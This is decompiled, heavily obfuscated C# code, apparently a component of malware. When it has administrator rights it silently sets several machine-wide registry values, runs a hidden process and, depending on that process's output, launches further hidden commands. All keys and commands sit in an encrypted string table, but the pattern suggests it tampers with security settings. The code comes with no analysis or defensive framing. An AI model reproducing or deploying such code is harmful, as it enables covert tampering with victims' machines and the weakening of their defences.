using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bfaErnBXmrcm;

public static class owbOyrXWqycAXFY
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void fCHPAUxqNmNzL()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			NQdKPZyPFZEJF(getString_0(107372916), getString_0(107372855), getString_0(107395782));
			NQdKPZyPFZEJF(getString_0(107372798), getString_0(107372737), getString_0(107395799));
			NQdKPZyPFZEJF(getString_0(107372744), getString_0(107373167), getString_0(107395799));
			NQdKPZyPFZEJF(getString_0(107372744), getString_0(107373130), getString_0(107395799));
			NQdKPZyPFZEJF(getString_0(107372744), getString_0(107373061), getString_0(107395799));
			vrOfAEVhfvjaH();
		}
	}

	private static void NQdKPZyPFZEJF(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void vrOfAEVhfvjaH()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107359899),
			Arguments = getString_0(107373024),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107372987)) && text.EndsWith(getString_0(107372982)))
			{
				QOTpGHnVmitizX(getString_0(107372973));
			}
			else if (text.StartsWith(getString_0(107373167)) && text.EndsWith(getString_0(107372982)))
			{
				QOTpGHnVmitizX(getString_0(107372392));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107372291))) && text.EndsWith(getString_0(107372982)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107372278)));
			}
			else if (text.StartsWith(getString_0(107372669)) && text.EndsWith(getString_0(107372982)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107372640)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107372591))) && text.EndsWith(getString_0(107372982)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107372558)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107372449))) && text.EndsWith(getString_0(107372982)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371888)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371763))) && text.EndsWith(getString_0(107372982)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371686)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107372141))) && text.EndsWith(getString_0(107372982)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107372080)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371943))) && text.EndsWith(getString_0(107372982)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371390)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371341))) && !text.EndsWith(getString_0(107396241)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371268)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371223))) && !text.EndsWith(getString_0(107395782)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371162)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371613))) && !text.EndsWith(getString_0(107371600)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371595)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371502))) && !text.EndsWith(getString_0(107371600)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371421)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107370820))) && !text.EndsWith(getString_0(107371600)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107370807)));
			}
			else if (text.StartsWith(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107370730))) && !text.EndsWith(getString_0(107371600)))
			{
				QOTpGHnVmitizX(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107370649)));
			}
		}
	}

	public static void QOTpGHnVmitizX(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107359899),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static owbOyrXWqycAXFY()
	{
		Strings.CreateGetStringDelegate(typeof(owbOyrXWqycAXFY));
	}
}
